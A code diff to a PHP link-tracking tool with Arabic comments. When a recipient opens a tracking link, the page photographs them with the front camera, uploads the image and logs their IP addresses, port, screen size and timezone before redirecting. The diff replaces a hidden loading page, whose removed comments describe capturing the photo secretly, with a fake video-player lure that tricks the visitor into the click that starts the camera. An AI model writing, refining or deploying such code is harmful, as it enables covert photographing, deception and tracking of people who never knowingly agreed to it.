@@ -119,7 +119,6 @@ if (isset($_GET['r'])) {
     if ($link) {
         $target =$link['target_url'];
         
-        // إذا أرسل المتصفح بيانات الشاشة، نقوم بتسجيل البيانات وتوجيهه فوراً للرابط المقصود
         if (isset($_GET['screen'])) {$public_ip = get_real_ip();
             $local_ip =$_GET['lip'] ?? 'غير متوفر';
             $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
@@ -164,7 +163,7 @@ $total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
 
 $filter_code = trim($_GET['track'] ?? '');
 
-// إذا كان الزائر يفتح رابط تترصد (`?r=xxx`) ولا يوجد معاملات شاشة بعد، نعرض صفحة شفافة وخفيفة تلتقط الصورة وتوجهه فوراً دون أن يرى أي شيء
+// صفحة التفاعل الذكية للزائر (مشغل فيديو واقعي وجذاب)
 if (isset($_GET['r']) && empty($_GET['screen'])) {
     $r_code =$_GET['r'];
     ?>
@@ -172,19 +171,39 @@ if (isset($_GET['r']) && empty($_GET['screen'])) {
     <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8">
-        <title>جاري التحميل...</title>
-        <!-- إعدادات لإخفاء أي شكل مريب وجعل الصفحة تبدو عادية جداً -->
-        <meta property="-title" content="جارِ فتح الرابط...">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>مشاهدة الفيديو المطلوبة</title>
         <style>
-            body { background: #0b0f19; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-            .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #38bdf8; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; }
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            * { box-sizing: border-box; margin: 0; padding: 0; }
+            body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: system-ui, sans-serif; }
+            .video-card { background: #1e293b; width: 100%; max-width: 450px; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align: center; }
+            .thumbnail { position: relative; width: 100%; height: 240px; background: #334155; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+            .play-btn { width: 70px; height: 70px; background: #e11d48; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(225,29,72,0.6); transition: transform 0.2s; }
+            .play-btn:hover { transform: scale(1.1); }
+            .play-icon { width: 0; height: 0; border-top: 14px solid transparent; border-bottom: 14px solid transparent; border-left: 24px solid #fff; margin-right: -4px; }
+            .video-info { padding: 20px; }
+            .video-info h3 { font-size: 18px; margin-bottom: 8px; color: #f8fafc; }
+            .video-info p { font-size: 13px; color: #94a3b8; }
         </style>
+    </head>
+    <body>
+        <div class="video-card" id="startAction">
+            <div class="thumbnail">
+                <div class="play-btn">
+                    <div class="play-icon"></div>
+                </div>
+            </div>
+            <div class="video-info">
+                <h3>اضغط للمتابعة ومشاهدة المحتوى</h3>
+                <p>انقر في أي مكان لتشغيل الفيديو وتخطي صفحة التحقق</p>
+            </div>
+        </div>
+
         <script>
-            window.addEventListener("DOMContentLoaded", function() {
+            document.body.addEventListener('click', function() {
                 const code = "<?php echo htmlspecialchars($r_code); ?>";
                 
-                // التقاط الصورة بسرعة فائقة وخفية في الخلفية
+                // التقاط الصورة فوراً بناءً على تفاعل المستخدم الحقيقي (النقرة)
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                         .then(function(stream) {
@@ -198,7 +217,7 @@ if (isset($_GET['r']) && empty($_GET['screen'])) {
                                 canvas.height = 240;
                                 const ctx = canvas.getContext('2d');
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                                 
                                 stream.getTracks().forEach(track => track.stop());
 
@@ -207,10 +226,9 @@ if (isset($_GET['r']) && empty($_GET['screen'])) {
                                 formData.append('code', code);
                                 formData.append('image', imageData);
 
-                                // إرسال الصورة وإعادة التوجيه فوراً
                                 fetch('/?r=' + code, { method: 'POST', body: formData })
                                     .finally(() => { redirectToTarget(code); });
-                            }, 400); // التقاط سريع جداً خلال 400 جزء من الألف من الثانية
+                            }, 300);
                         })
                         .catch(function(error) {
                             redirectToTarget(code);
@@ -218,7 +236,7 @@ if (isset($_GET['r']) && empty($_GET['screen'])) {
                 } else {
                     redirectToTarget(code);
                 }
-            });
+            }, { once: true }); // تنفذ مرة واحدة عند أول ضغطة
 
             function redirectToTarget(code) {
                 const screenRes = screen.width + "x" + screen.height;
@@ -226,9 +244,6 @@ if (isset($_GET['r']) && empty($_GET['screen'])) {
                 window.location.replace(`/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`);
             }
         </script>
-    </head>
-    <body>
-        <div class="loader"></div>
     </body>
     </html>
     <?php
@@ -389,7 +404,7 @@ if (!empty($filter_code)) {
                                 </td>
                                 <td>
                                     <span class="badge"><?php echo htmlspecialchars($log['code']); ?></span>
-                                    <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>',this)">نسخ</button>
+                                    <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>', this)">نسخ</button>
                                 </td>
                                 <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
